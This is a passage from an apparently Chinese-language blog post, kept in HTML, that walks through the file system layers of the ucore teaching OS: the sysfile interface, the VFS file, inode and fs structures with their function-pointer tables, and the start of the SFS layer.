src="../../image/ucore/image-20220105200433737.png" alt="image-20220105200433737"></p><h3 id="2-系统访问接口层"><a href="#2-系统访问接口层" class="headerlink" title="2.系统访问接口层"></a>2.系统访问接口层</h3><p>从用户态函数syscall-&gt;sys_open(syscall.c)-&gt;sysfile_open(sysfile.c)中:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_open</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">uint32_t</span> open_flags)</span></span>;     <span class="hljs-comment">// Open or create a file. FLAGS/MODE per the syscall.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_close</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;                                      <span class="hljs-comment">// Close a vnode opened  </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> len)</span></span>;               <span class="hljs-comment">// Read file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> len)</span></span>;              <span class="hljs-comment">// Write file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">off_t</span> pos, <span class="hljs-keyword">int</span> whence)</span></span>;                <span class="hljs-comment">// Seek file  </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_fstat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct stat *stat)</span></span>;                   <span class="hljs-comment">// Stat file </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_fsync</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;                                      <span class="hljs-comment">// Sync file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_chdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path)</span></span>;                            <span class="hljs-comment">// change DIR  </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_mkdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path)</span></span>;                            <span class="hljs-comment">// create DIR</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_link</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path1, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path2)</span></span>;         <span class="hljs-comment">// set a path1&#x27;s link as path2</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_rename</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path1, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path2)</span></span>;       <span class="hljs-comment">// rename file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_unlink</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path)</span></span>;                           <span class="hljs-comment">// unlink a path</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_getcwd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> len)</span></span>;                      <span class="hljs-comment">// get current working directory</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_getdirentry</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct dirent *direntp)</span></span>;        <span class="hljs-comment">// get the file entry in DIR </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_dup</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd1, <span class="hljs-keyword">int</span> fd2)</span></span>;                              <span class="hljs-comment">// duplicate file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *fd_store)</span></span>;                                <span class="hljs-comment">// build PIPE   </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_mkfifo</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">uint32_t</span> open_flags)</span></span>;      <span class="hljs-comment">// build named PIPE</span><br></code></pre></div></td></tr></table></figure><p>然后调用file.c中具体的实现:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_open</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">uint32_t</span> open_flags)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_close</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">size_t</span> *copied_store)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">size_t</span> *copied_store)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">off_t</span> pos, <span class="hljs-keyword">int</span> whence)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_fstat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct stat *stat)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_fsync</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_getdirentry</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct dirent *dirent)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_dup</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd1, <span class="hljs-keyword">int</span> fd2)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd[])</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_mkfifo</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">uint32_t</span> open_flags)</span></span>;<br></code></pre></div></td></tr></table></figure><p>sysfile_xxx算是在写操作系统的时候比较常用的函数.</p><h3 id="3-VFS层"><a href="#3-VFS层" class="headerlink" title="3.VFS层"></a>3.VFS层</h3><p>VFS有四个接口, 分别是file&amp;dir接口, inode接口, fs接口和外设接口. </p><h4 id="file-amp-dir接口"><a href="#file-amp-dir接口" class="headerlink" title="file&amp;dir接口"></a>file&amp;dir接口</h4><p>file&amp;dir接口层(共用一个结构体, 毕竟目录也是一种文件)定义了进程在内核中直接访问的文件相关信息，这定义在file数据结构中，具体描述如下：</p><blockquote><p>其中fd取决于进程的文件打开顺序, 最大值是<code>(4096 - sizeof(struct files_struct)) / sizeof(struct file)</code><br>而且在fd_array初始化的时候看起来file_struct和file挤满4KB空间, 不过不知道为什么</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>        FD_NONE, FD_INIT, FD_OPENED, FD_CLOSED,<br>    &#125; status;                         <span class="hljs-comment">//访问文件的执行状态</span><br>    <span class="hljs-keyword">bool</span> readable;                    <span class="hljs-comment">//文件是否可读</span><br>    <span class="hljs-keyword">bool</span> writable;                    <span class="hljs-comment">//文件是否可写</span><br>    <span class="hljs-keyword">int</span> fd;                           <span class="hljs-comment">//文件在filemap中的索引值</span><br>    <span class="hljs-keyword">off_t</span> pos;                        <span class="hljs-comment">//访问文件的当前位置</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">node</span>;</span>               <span class="hljs-comment">//该文件对应的内存inode指针</span><br>    <span class="hljs-keyword">int</span> open_count;                   <span class="hljs-comment">//打开此文件的次数</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>而在kern/process/proc.h中的proc_struct结构中描述了进程访问文件的数据接口files_struct，其数据结构定义如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">files_struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">pwd</span>;</span>                <span class="hljs-comment">//进程当前执行目录的内存inode指针</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">fd_array</span>;</span>            <span class="hljs-comment">//进程打开文件的数组</span><br>    <span class="hljs-keyword">atomic_t</span> files_count;             <span class="hljs-comment">//访问此文件的线程个数</span><br>    <span class="hljs-keyword">semaphore_t</span> files_sem;            <span class="hljs-comment">//确保对进程控制块中fs_struct的互斥访问</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>当创建一个进程后，该进程的files_struct将会被初始化或复制父进程的files_struct。当用户进程打开一个文件时，将从fd_array数组中取得一个空闲file项，然后会把此file的成员变量node指针指向一个代表此文件的inode的起始地址。</p><h4 id="inode接口"><a href="#inode接口" class="headerlink" title="inode接口"></a>inode接口</h4><p><u>index node</u>是位于内存的索引节点，它是VFS结构中的重要数据结构，因为它实际负责把不同文件系统的特定索引节点信息（甚至不能算是一个索引节点）统一封装起来，避免了进程直接访问具体文件系统。其定义如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span>                                 <span class="hljs-comment">//包含不同文件系统特定inode信息的union成员变量</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> __<span class="hljs-title">device_info</span>;</span>          <span class="hljs-comment">//设备文件系统内存inode信息</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_inode</span> __<span class="hljs-title">sfs_inode_info</span>;</span>    <span class="hljs-comment">//SFS文件系统内存inode信息</span><br>    &#125; in_info;   <br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>        inode_type_device_info = <span class="hljs-number">0x1234</span>,<br>        inode_type_sfs_inode_info,<br>    &#125; in_type;                          <span class="hljs-comment">//此inode所属文件系统类型</span><br>    <span class="hljs-keyword">atomic_t</span> ref_count;                 <span class="hljs-comment">//此inode的引用计数</span><br>    <span class="hljs-keyword">atomic_t</span> open_count;                <span class="hljs-comment">//打开此inode对应文件的个数</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs</span> *<span class="hljs-title">in_fs</span>;</span>                   <span class="hljs-comment">//抽象的文件系统，包含访问文件系统的函数指针</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> *<span class="hljs-title">in_ops</span>;</span>     <span class="hljs-comment">//抽象的inode操作，包含访问inode的函数指针     </span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>其中in_ops是一系列函数指针, 其实并不会全部用到, 只要定义需要的即可:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> &#123;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> vop_magic;<br>    <span class="hljs-keyword">int</span> (*vop_open)(struct inode *node, <span class="hljs-keyword">uint32_t</span> open_flags);<br>    <span class="hljs-keyword">int</span> (*vop_close)(struct inode *node);<br>    <span class="hljs-keyword">int</span> (*vop_read)(struct inode *node, struct iobuf *iob);<br>    <span class="hljs-keyword">int</span> (*vop_write)(struct inode *node, struct iobuf *iob);<br>    <span class="hljs-keyword">int</span> (*vop_fstat)(struct inode *node, struct stat *stat);<br>    <span class="hljs-keyword">int</span> (*vop_fsync)(struct inode *node);<br>    <span class="hljs-keyword">int</span> (*vop_namefile)(struct inode *node, struct iobuf *iob);<br>    <span class="hljs-keyword">int</span> (*vop_getdirentry)(struct inode *node, struct iobuf *iob);<br>    <span class="hljs-keyword">int</span> (*vop_reclaim)(struct inode *node);<br>    <span class="hljs-keyword">int</span> (*vop_gettype)(struct inode *node, <span class="hljs-keyword">uint32_t</span> *type_store);<br>    <span class="hljs-keyword">int</span> (*vop_tryseek)(struct inode *node, <span class="hljs-keyword">off_t</span> pos);<br>    <span class="hljs-keyword">int</span> (*vop_truncate)(struct inode *node, <span class="hljs-keyword">off_t</span> len);<br>    <span class="hljs-keyword">int</span> (*vop_create)(struct inode *node, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">bool</span> excl, struct inode **node_store);<br>    <span class="hljs-keyword">int</span> (*vop_lookup)(struct inode *node, <span class="hljs-keyword">char</span> *path, struct inode **node_store);<br>    <span class="hljs-keyword">int</span> (*vop_ioctl)(struct inode *node, <span class="hljs-keyword">int</span> op, <span class="hljs-keyword">void</span> *data);<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>实际用到的时候会使用宏定义简化, 利用语句块的值是最后一条语句的值来返回函数指针:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __vop_op(node, sym)                                                                         \</span><br><span class="hljs-meta">    (&#123;                                                                                              \</span><br><span class="hljs-meta">        struct inode *__node = (node);                                                              \</span><br><span class="hljs-meta">        assert(__node != NULL &amp;&amp; __node-&gt;in_ops != NULL &amp;&amp; __node-&gt;in_ops-&gt;vop_##sym != NULL);      \</span><br><span class="hljs-meta">        inode_check(__node, #sym);                                                                  \</span><br><span class="hljs-meta">        __node-&gt;in_ops-&gt;vop_##sym;  <span class="hljs-comment">/*把字符连接起来*/</span>                                               \</span><br><span class="hljs-meta">     &#125;)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> vop_open(node, open_flags)                                  (__vop_op(node, open)(node, open_flags))</span><br></code></pre></div></td></tr></table></figure><p><code>inode_ops</code>成员是对常规文件、目录、设备文件所有操作的一个抽象函数表示。对于某一具体的文件系统中的文件或目录，只需实现相关的函数，就可以被用户进程访问具体的文件了，且用户进程无需了解具体文件系统的实现细节。</p><p><strong>注意到这些是对下一层SFS的接口, 在下一层中被实现.</strong> 可选实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Function table for device inodes.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// The sfs specific DIR operations correspond to the abstract operations on a inode.</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">sfs_node_dirops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>    .vop_open                       = sfs_opendir,<br>    .vop_close                      = sfs_close,<br>    .vop_fstat                      = sfs_fstat,<br>    .vop_fsync                      = sfs_fsync,<br>    .vop_namefile                   = sfs_namefile,<br>    .vop_getdirentry                = sfs_getdirentry,<br>    .vop_reclaim                    = sfs_reclaim,<br>    .vop_gettype                    = sfs_gettype,<br>    .vop_lookup                     = sfs_lookup,<br>&#125;;<br><span class="hljs-comment">/// The sfs specific FILE operations correspond to the abstract operations on a inode.</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">sfs_node_fileops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>    .vop_open                       = sfs_openfile,<br>    .vop_close                      = sfs_close,<br>    .vop_read                       = sfs_read,<br>    .vop_write                      = sfs_write,<br>    .vop_fstat                      = sfs_fstat,<br>    .vop_fsync                      = sfs_fsync,<br>    .vop_reclaim                    = sfs_reclaim,<br>    .vop_gettype                    = sfs_gettype,<br>    .vop_tryseek                    = sfs_tryseek,<br>    .vop_truncate                   = sfs_truncfile,<br>&#125;;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">dev_node_ops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>    .vop_open                       = dev_open,<br>    .vop_close                      = dev_close,<br>    .vop_read                       = dev_read,<br>    .vop_write                      = dev_write,<br>    .vop_fstat                      = dev_fstat,<br>    .vop_ioctl                      = dev_ioctl,<br>    .vop_gettype                    = dev_gettype,<br>    .vop_tryseek                    = dev_tryseek,<br>    .vop_lookup                     = dev_lookup,<br>&#125;;<br></code></pre></div></td></tr></table></figure><h4 id="fs接口"><a href="#fs接口" class="headerlink" title="fs接口"></a>fs接口</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_fs</span> __<span class="hljs-title">sfs_info</span>;</span>                   <br>    &#125; fs_info;                                     <span class="hljs-comment">// filesystem-specific data </span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>        fs_type_sfs_info,<br>    &#125; fs_type;                                     <span class="hljs-comment">// filesystem type </span><br>    <span class="hljs-keyword">int</span> (*fs_sync)(struct fs *fs);                 <span class="hljs-comment">// Flush all dirty buffers to disk </span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *(*<span class="hljs-title">fs_get_root</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">fs</span> *<span class="hljs-title">fs</span>);</span>   <span class="hljs-comment">// Return root inode of filesystem.</span><br>    <span class="hljs-keyword">int</span> (*fs_unmount)(struct fs *fs);              <span class="hljs-comment">// Attempt unmount of filesystem.</span><br>    <span class="hljs-keyword">void</span> (*fs_cleanup)(struct fs *fs);             <span class="hljs-comment">// Cleanup of filesystem.???</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><hr><p>所以VFS具体是怎么个抽象法儿呢? </p><p>首先是对PCB中的文件进行抽象, 弄一个files_struct管理fd_array, 每个文件使用file进行定义, file中有基本的打开计数权限索引等等, 处于一个非常高的抽象层, 而且是针对用户的.</p><p>file中包含了一个index node指针, node记录了设备文件和SFS文件的inode信息(元数据), <strong>向下给sfs_inode和device提供了接口</strong>.</p><p>inode包含一个struct fs*, <strong>而fs向下接到了SFS层的sys_fs</strong>结构体, 这个才是具体到文件系统的总体信息, 比如super dev bitmap, 这些都是文件的磁盘布局信息.</p><p>当我们需要对文件file层面操作的时候(比如在path下查找 创建 删除等), 我们可以调用file对应inode(元数据)的函数指针, 实际上是调用了sfs层的函数去进行下一步的操作, inode充当的是中间层, 往下可以使各种各样的文件系统.</p><h3 id="4-SFS层"><a href="#4-SFS层" class="headerlink" title="4.SFS层"></a>4.SFS层</h3><p>SFS文件系统中目录和常规文件具有共同的属性，而这些属性保存在索引节点中。SFS通过索引节点来管理目录和常规文件，索引节点包含操作系统所需要的关于某个文件的关键信息，比如文件的属性、访问许可权以及其它控制信息都保存在索引节点中。多个文件名可指向一个索引节点。</p><h4 id="函数接口与数据结构"><a href="#函数接口与数据结构" class="headerlink" title="函数接口与数据结构"></a>函数接口与数据结构</h4><blockquote><p>在sfs.h中</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sfs_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_mount</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *devname)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">lock_sfs_fs</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">lock_sfs_io</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unlock_sfs_fs</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unlock_sfs_io</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_rblock</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">uint32_t</span> nblks)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_wblock</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">uint32_t</span> nblks)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_rbuf</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">off_t</span> offset)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_wbuf</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">off_t</span> offset)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_sync_super</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_sync_freemap</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_clear_block</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">uint32_t</span> nblks)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_load_inode</span><span class="hljs-params">(struct sfs_fs *sfs, struct inode **node_store, <span class="hljs-keyword">uint32_t</span> ino)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sfs_sync</span><span class="hljs-params">(struct fs *fs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> struct inode* <span class="hljs-title">sfs_get_root</span><span class="hljs-params">(struct fs *fs)</span> </span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sfs_unmount</span><span class="hljs-params">(struct fs *fs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sfs_cleanup</span><span class="hljs-params">(struct fs *fs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">fs_init_read</span><span class="hljs-params">(struct device *dev, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">void</span> *blk_buffer)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">fs_do_mount</span><span class="hljs-params">(struct device *dev, struct fs **fs_store)</span></span>;<br><span class="hljs-comment">// ......</span><br></code></pre></div></td></tr></table></figure><p><code>sfs_fs</code>其实现如下所示</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 